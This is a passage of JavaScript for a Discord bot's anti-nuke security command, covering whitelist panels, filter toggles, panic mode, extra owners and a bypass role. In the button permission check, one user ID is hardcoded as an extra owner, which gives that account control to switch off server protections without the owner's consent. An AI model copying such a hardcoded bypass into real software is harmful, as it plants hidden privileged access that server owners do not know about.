              const hasAny = keys.some(k => currentPerms.has(k) || currentPerms.has('all'));
              if (currentPerms.has('all')) currentPerms = new Set(ALL_PERMS.filter(p => p !== 'all' && !keys.includes(p)));
              else if (hasAny) keys.forEach(k => currentPerms.delete(k));
              else keys.forEach(k => currentPerms.add(k));
            } else if (selected === 'cat_member') {
              const keys = ['member_update', 'member_dangerous'];
              const hasAny = keys.some(k => currentPerms.has(k) || currentPerms.has('all'));
              if (currentPerms.has('all')) currentPerms = new Set(ALL_PERMS.filter(p => p !== 'all' && !keys.includes(p)));
              else if (hasAny) keys.forEach(k => currentPerms.delete(k));
              else keys.forEach(k => currentPerms.add(k));
            } else if (selected === 'cat_bot') {
              const keys = ['bot', 'integration'];
              const hasAny = keys.some(k => currentPerms.has(k) || currentPerms.has('all'));
              if (currentPerms.has('all')) currentPerms = new Set(ALL_PERMS.filter(p => p !== 'all' && !keys.includes(p)));
              else if (hasAny) keys.forEach(k => currentPerms.delete(k));
              else keys.forEach(k => currentPerms.add(k));
            } else if (selected === 'cat_guild') {
              const keys = ['guild'];
              const hasAny = keys.some(k => currentPerms.has(k) || currentPerms.has('all'));
              if (currentPerms.has('all')) currentPerms = new Set(ALL_PERMS.filter(p => p !== 'all' && !keys.includes(p)));
              else if (hasAny) keys.forEach(k => currentPerms.delete(k));
              else keys.forEach(k => currentPerms.add(k));
            } else if (selected === 'cat_assets') {
              const keys = ['sticker', 'emoji'];
              const hasAny = keys.some(k => currentPerms.has(k) || currentPerms.has('all'));
              if (currentPerms.has('all')) currentPerms = new Set(ALL_PERMS.filter(p => p !== 'all' && !keys.includes(p)));
              else if (hasAny) keys.forEach(k => currentPerms.delete(k));
              else keys.forEach(k => currentPerms.add(k));
            }
          } else if (interaction.customId === `wl_btn_all_${user.id}`) {
            if (currentPerms.has('all')) {
              currentPerms.clear();
            } else {
              currentPerms = new Set(['all']);
            }
          }

          if (currentPerms.size > 0) {
            config.whitelistedUsers.set(user.id, currentPerms);
          } else {
            config.whitelistedUsers.delete(user.id);
          }
          antinukeConfigs.set(guild.id, config);
          saveAntinukeToDb(guild.id, config);

          const updatedEmbed = new EmbedBuilder()
            .setColor(0xE74C3C)
            .setTitle(guild.name)
            .setThumbnail(guildIcon)
            .setDescription(buildOlympusDescription(currentPerms))
            .setFooter({
              text: 'Powered by Naruto Bot Development™',
              iconURL: clientUser.displayAvatarURL({ dynamic: true })
            });

          return interaction.update({ embeds: [updatedEmbed], components: buildOlympusComponents(currentPerms) });
        });

        return;
      }

      // .whitelist add @user [perms]
      if (action === 'add' && user) {
        let permArgs = args.slice(2).map(p => p.toLowerCase()).filter(p => ALL_PERMS.includes(p) || p === 'all');
        if (permArgs.length === 0) permArgs = ['all'];
        if (permArgs.length > 0) {
          const grantedPerms = new Set(permArgs);
          config.whitelistedUsers.set(user.id, grantedPerms);
          antinukeConfigs.set(guild.id, config);
          saveAntinukeToDb(guild.id, config);

          const embed = createStyledEmbed({
            title: `<a:membercard_animated:1537177436146638993> Member Whitelisted with Granular Perms`,
            description:
              `**User:** <@${user.id}> (\`${user.tag}\`)\n` +
              `**Granted Permissions:** ${formatUserPerms(grantedPerms)}\n\n` +
              `**Management Panel:**\n` +
              `\`\`\`\n` +
              `.whitelist @${user.username}\n` +
              `\`\`\``,
            requestedBy: author,
            clientUser
          });
          return message.channel.send({ embeds: [embed] });
        }
      }

      // .whitelist remove @user
      if (action === 'remove' && user) {
        config.whitelistedUsers.delete(user.id);
        antinukeConfigs.set(guild.id, config);
        saveAntinukeToDb(guild.id, config);
        return message.reply(`${emojis.SUCCESS} Removed **${user.tag}** from AntiNuke Whitelist.`);
      }

      // Default DEDICATED WHITELISTED USERS LIST PANEL (&whitelisted / .whitelist list)
      const listItems = [];
      for (const [id, permsSet] of config.whitelistedUsers.entries()) {
        const u = message.client.users.cache.get(id);
        const nameStr = u ? `@${u.username}` : `<@${id}>`;
        const permStr = permsSet.has('all') ? 'All Events' : Array.from(permsSet).join(', ').toUpperCase();
        listItems.push(`• ${nameStr} :- ${permStr}`);
      }

      const listContent = listItems.join('\n') || '• No users whitelisted yet.';

      const wlBox = createDynamicBox('WHITELISTED USERS', listItems.length > 0 ? listItems : ['• None configured']);
      const cmdBox = createDynamicBox('WHITELIST COMMANDS', [
        '.whitelist add @user',
        '.whitelist remove @user',
        '.whitelist status @user',
        '.whitelisted'
      ]);

      const embed = createStyledEmbed({
        title: `<a:wrong_animated:1537179702928875631> Whitelisted Users — ${guild.name}`,
        subtitle: `Authorized Security Bypass Delegation`,
        description:
          `Below are all authorized whitelisted users for **${guild.name}**:\n\n` +
          '```\n' + wlBox + '\n```\n' +
          '```\n' + cmdBox + '\n```',
        requestedBy: author,
        clientUser
      });

      const navRow = new ActionRowBuilder().addComponents(
        new ButtonBuilder().setCustomId('wl_page_back').setLabel('Go Back').setEmoji('<a:wrong_animated:1537179702928875631>').setStyle(ButtonStyle.Danger),
        new ButtonBuilder().setCustomId('wl_page_prev').setLabel('Previous').setStyle(ButtonStyle.Secondary).setDisabled(true),
        new ButtonBuilder().setCustomId('wl_page_next').setLabel('Next').setStyle(ButtonStyle.Secondary).setDisabled(true)
      );

      return message.channel.send({ embeds: [embed], components: [navRow] });
    }

    // 1. .antinuke enable [feature/all]
    if (sub === 'enable' || sub === 'on') {
      const target = args[1]?.toLowerCase();

      if (!target || target === 'all') {
        config.enabled = true;
        Object.keys(config.filters).forEach(k => config.filters[k] = true);
        
        // Auto-create AntiNuke Bypass role if missing
        let bypassRole = guild.roles.cache.find(r => r.name === 'AntiNuke Bypass');
        if (!bypassRole) {
          bypassRole = await guild.roles.create({
            name: 'AntiNuke Bypass',
            color: 0x3498DB,
            reason: 'AntiNuke Auto-Bypass Role Creation on Enable'
          }).catch(() => null);
        }
        if (bypassRole) {
          config.bypassRoles.add(bypassRole.id);
        }

        antinukeConfigs.set(guild.id, config);
        return message.reply(`${emojis.SHIELD} AntiNuke Security System & ALL protection filters are now **ENABLED**! (Role \`AntiNuke Bypass\` created & assigned)`);
      }

      if (FILTER_MAP[target]) {
        config.enabled = true;
        FILTER_MAP[target].forEach(k => config.filters[k] = true);
        antinukeConfigs.set(guild.id, config);
        return message.reply(`${emojis.SUCCESS} AntiNuke feature **${target.toUpperCase()}** enabled successfully!`);
      }
    }

    // 2. .antinuke disable [feature/all]
    if (sub === 'disable' || sub === 'off') {
      const target = args[1]?.toLowerCase();

      if (!target || target === 'all') {
        config.enabled = false;
        Object.keys(config.filters).forEach(k => config.filters[k] = false);

        // Auto-delete AntiNuke Bypass role if present
        const bypassRole = guild.roles.cache.find(r => r.name === 'AntiNuke Bypass');
        if (bypassRole) {
          await bypassRole.delete('AntiNuke Auto-Bypass Role Deletion on Disable').catch(() => {});
          config.bypassRoles.delete(bypassRole.id);
        }

        antinukeConfigs.set(guild.id, config);
        return message.reply(`${emojis.WARNING} AntiNuke Security System is now **DISABLED**. (Role \`AntiNuke Bypass\` removed)`);
      }

      if (FILTER_MAP[target]) {
        FILTER_MAP[target].forEach(k => config.filters[k] = false);
        antinukeConfigs.set(guild.id, config);
        return message.reply(`${emojis.WARNING} AntiNuke feature **${target.toUpperCase()}** disabled.`);
      }
    }

    // 3. .panicmode enable / disable / reset / set <level>
    if (sub === 'panicmode' || invoked === 'panicmode') {
      const mode = args[1]?.toLowerCase() || args[0]?.toLowerCase();

      if (mode === 'enable' || mode === 'on') {
        config.panicmode = true;
        config.enabled = true;
        antinukeConfigs.set(guild.id, config);
      } else if (mode === 'disable' || mode === 'off') {
        config.panicmode = false;
        antinukeConfigs.set(guild.id, config);
      } else if (mode === 'reset') {
        config.panicmode = false;
        config.panicLevel = 1;
        antinukeConfigs.set(guild.id, config);
      } else if (mode === 'set' && args[2]) {
        const lvl = parseInt(args[2]);
        if (!isNaN(lvl) && lvl >= 1 && lvl <= 3) {
          config.panicLevel = lvl;
          antinukeConfigs.set(guild.id, config);
        }
      }
    }

    // 4. .extraowner add @user / remove @user / list
    if (sub === 'extraowner' || invoked === 'extraowner') {
      const action = args[1]?.toLowerCase();
      const user = message.mentions.users.first() || (args[2] ? await message.client.users.fetch(args[2]).catch(() => null) : null);

      if (action === 'add' && user) {
        config.extraOwners.add(user.id);
        antinukeConfigs.set(guild.id, config);
        return message.reply(`<a:crown_animated:1537177361093500968> Added **${user.tag}** as Extra Owner with full security bypass permissions!`);
      }

      if (action === 'remove' && user) {
        config.extraOwners.delete(user.id);
        antinukeConfigs.set(guild.id, config);
        return message.reply(`<a:crown_animated:1537177361093500968> Removed **${user.tag}** from Extra Owners.`);
      }

      const list = Array.from(config.extraOwners).map(id => `• <@${id}> (\`${id}\`)`).join('\n') || '*No Extra Owners assigned.*';
      return message.reply({
        embeds: [
          createStyledEmbed({
            title: `<a:crown_animated:1537177361093500968> Server Extra Owners`,
            description: `**Current Extra Owners:**\n${list}\n\n**Usage:**\n\`.extraowner add @user\`\n\`.extraowner remove @user\``,
            requestedBy: author,
            clientUser
          })
        ]
      });
    }

    // Default Status Dashboard (.antinuke / .panicmode) WITH INTERACTIVE BUTTONS
    const embed = renderAntinukeDashboard(config, author, clientUser);
    const rows = renderPanicComponents(config);

    const msg = await message.channel.send({ embeds: [embed], components: rows });

    const collector = msg.createMessageComponentCollector({ time: 300000 });

    collector.on('collect', async (interaction) => {
      // PANEL OWNERSHIP CHECK: Only the user who invoked this panel message can interact with it
      if (interaction.user.id !== author.id) {
        return interaction.reply({
          content: `${emojis.WARNING || '<a:wrong_animated:1537179702928875631>'} **Access Denied**: Only **${author.username}** (who requested this panel) can click these buttons.`,
          flags: 64
        });
      }

      // PERMISSION CHECK for button clicks
      const isOwnerBtn = guild.ownerId === interaction.user.id;
      const isExtraOwnerBtn = config.extraOwners.has(interaction.user.id) || ['1420687548807905324',  ].includes(interaction.user.id);

      if (!isOwnerBtn && !isExtraOwnerBtn) {
        return interaction.reply({
          content: `${emojis.ERROR} **Access Denied**: Only the **Server Owner** and **Extra Owners** can toggle security settings!`,
          flags: 64
        });
      }

      const id = interaction.customId;
      const f = config.filters;
      const jg = config.joinGate;
      const aq = config.autoQuarantine;

      if (id === 'an_whitelist_mgr') {
        const entries = [];
        for (const [uid, permsSet] of config.whitelistedUsers.entries()) {
          entries.push(`• <@${uid}> — ${formatUserPerms(permsSet)}`);
        }
        return interaction.reply({
          content: `<a:membercard_animated:1537177436146638993> **Whitelist Permissions Panel**\n${entries.join('\n') || 'No members whitelisted.'}\n\nUse \`.whitelist perms @user +ban -role\` to edit granular perms!`,
          flags: 64
        });
      }

      if (id === 'toggle_joingate') {
        jg.enabled = !jg.enabled;
      } else if (id === 'toggle_quarantine') {
        aq.enabled = !aq.enabled;
      } else if (id === 'toggle_panic') {
        config.panicmode = !config.panicmode;
        if (config.panicmode) config.enabled = true;
      } else if (id === 'toggle_shield') {
        config.enabled = !config.enabled;

        // Auto Bypass Role Creation/Deletion Lifecycle
        if (config.enabled) {
          let bypassRole = guild.roles.cache.find(r => r.name === 'AntiNuke Bypass');
          if (!bypassRole) {
            bypassRole = await guild.roles.create({
              name: 'AntiNuke Bypass',
              color: 0x3498DB,
              reason: 'AntiNuke Auto-Bypass Role Creation on Enable'
            }).catch(() => null);
          }
          if (bypassRole) {
            config.bypassRoles.add(bypassRole.id);
          }
        } else {
          const bypassRole = guild.roles.cache.find(r => r.name === 'AntiNuke Bypass');
          if (bypassRole) {
            await bypassRole.delete('AntiNuke Auto-Bypass Role Deletion on Disable').catch(() => {});
            config.bypassRoles.delete(bypassRole.id);
          }
        }
      } else if (id === 'toggle_ban') {
        f.antiBan = !f.antiBan;
      } else if (id === 'toggle_kick') {
        f.antiKick = !f.antiKick;
      } else if (id === 'toggle_bot') {
        f.antiBotAdd = !f.antiBotAdd;
      } else if (id === 'toggle_channel') {
        f.antiChannelCreate = !f.antiChannelCreate;
        f.antiChannelDelete = f.antiChannelCreate;
        f.antiChannelUpdate = f.antiChannelCreate;
      } else if (id === 'toggle_role') {
        f.antiRoleCreate = !f.antiRoleCreate;
        f.antiRoleDelete = f.antiRoleCreate;
        f.antiRoleUpdate = f.antiRoleCreate;
      } else if (id === 'an_enable_all') {
        config.enabled = true;
        Object.keys(config.filters).forEach(k => config.filters[k] = true);
      } else if (id === 'an_disable_all') {
        config.enabled = false;
        Object.keys(config.filters).forEach(k => config.filters[k] = false);
      } else if (id === 'an_refresh') {
        // Refresh only
      } else if (id === 'toggle_webhook') {
        f.antiWebhookCreate = !f.antiWebhookCreate;
        f.antiWebhookDelete = f.antiWebhookCreate;
        f.antiWebhookUpdate = f.antiWebhookCreate;
      } else if (id === 'toggle_spam') {
        f.antiSpam = !f.antiSpam;
      } else if (id === 'toggle_everyone') {
        f.antiEveryone = !f.antiEveryone;
      } else if (id === 'toggle_raid') {
        f.antiRaid = !f.antiRaid;
      } else if (id === 'toggle_guild') {
        f.antiGuildUpdate = !f.antiGuildUpdate;
      }

      antinukeConfigs.set(guild.id, config);

      const newEmbed = renderAntinukeDashboard(config, author, clientUser);
      const newRows = renderPanicComponents(config);

      return interaction.update({ embeds: [newEmbed], components: newRows });
    });

    collector.on('end', () => {
      msg.edit({ components: [] }).catch(() => {});
    });
  }
};


